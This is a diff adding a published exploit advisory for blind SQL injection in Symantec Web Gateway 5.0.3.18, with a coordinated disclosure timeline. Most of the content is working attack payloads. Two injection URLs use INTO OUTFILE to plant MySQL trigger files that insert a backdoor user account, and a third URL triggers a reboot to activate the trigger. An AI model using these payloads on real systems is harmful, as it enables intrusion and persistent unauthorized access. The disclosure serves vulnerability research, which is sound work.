@@ -1,0 +1,29 @@
+######################################################################################
+# Exploit Title: Symantec Web Gateway 5.0.3.18 Blind SQLi Backdoor via MySQL Triggers
+# Date: Jul 23 2012
+# Author: muts
+# Version: Symantec Web Gateway 5.0.3.18
+# Vendor URL: http://www.symantec.com
+#
+# Timeline:
+#
+# 12 Jun 2012: Vulnerability reported to CERT
+# 22 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+# 26 Jun 2012: Email received from Symantec for additional information
+# 26 Jun 2012: Additional proofs of concept sent to Symantec
+# 06 Jul 2012: Update received from Symantec with intent to fix
+# 20 Jul 2012: Symantec issued patch: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
+# 23 Jul 2012: Public Disclosure
+#
+######################################################################################
+
+
+Accessing the following URLs will create a new trigger that will create a user account on the victim database:
+
+https://server/spywall/ldap_latest.php?ip=1 union select 'TYPE=TRIGGERNAME' into outfile '/var/lib/mysql/spywall_db/ins_trig.TRN' LINES TERMINATED BY '\ntrigger_table=eventlog\n';--
+
+https://server/spywall/ldap_latest.php?ip=1 union select 'TYPE=TRIGGERS' into outfile '/var/lib/mysql/spywall_db/eventlog.TRG' LINES TERMINATED BY '\ntriggers=\'CREATE DEFINER=`shadm`@`localhost` trigger ins_trig after insert on eventlog\\nfor each row\\nbegin\\nINSERT INTO users VALUES("muts","21232f297a57a5a743894a0e4a801fc3","NULL","4773","2","3","N/A","0","0","0","","hacker@offsec.com","1336255408","0","0","0");\\nend\'\nsql_modes=0\ndefiners=\'shadm@localhost\'\nclient_cs_names=\'latin1\'\nconnection_cl_names=\'latin1_swedish_ci\'\ndb_cl_names=\'latin1_swedish_ci\'\n';--
+
+With the MySQL trigger in place, an authenticated user can initiate a reboot of the remote system by accessing the following URL. When a user logs back in to the application, the trigger will be activated and the new user will be added to the system.
+
+https://server/spywall/scheduledReboot.php
